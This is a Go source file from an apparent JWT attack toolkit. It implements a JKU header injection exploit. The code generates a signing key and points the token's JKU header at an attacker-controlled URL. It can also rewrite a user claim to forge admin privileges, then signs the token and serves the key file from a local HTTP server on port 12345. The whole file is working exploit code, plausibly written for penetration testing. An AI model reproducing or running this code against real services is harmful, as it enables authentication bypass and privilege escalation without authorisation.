package attacks

import (
	"JWTechniques/ctrl"
	"fmt"
	"net/http"
	"strconv"

	"github.com/golang-jwt/jwt/v5"
)

func LaunchServer(port int) {

	fmt.Printf("The server is being launched on port %d\n", port)

	//Serve files from the "./files" directory
	fs := http.FileServer(http.Dir(ctrl.Directory))
	http.Handle("/", fs)

	http.ListenAndServe(":"+strconv.Itoa(port), nil)
}

func ExploitJKU(token *jwt.Token, userHeader string, userValue string, url string) (string, error) {

	//Generate the private key and public key (if needed)
	jwtKey, pathToFile, err := ctrl.GenerateJWK(token.Header["alg"].(string))
	if err != nil {
		return "", err
	}

	//Change the value of the "JKU" header to set the path to our file containing our private key
	newToken, err := ctrl.ChangeValue(token, "JKU", url+pathToFile, true)
	if err != nil {
		return "", err
	}

	//Change the value of the header to create the admin privs token
	if userHeader != "" {
		newToken, err = ctrl.ChangeValue(newToken, userHeader, userValue, false)
		if err != nil {
			return "", err
		}
	}

	//Sign the token with our private key
	newJWT, err := newToken.SignedString(jwtKey) //TODO : change secret with correct
	if err != nil {
		return "", err
	}

	//Launch the server that will serve the jwk file
	go func() {
		LaunchServer(12345)
	}()

	return newJWT, nil

}
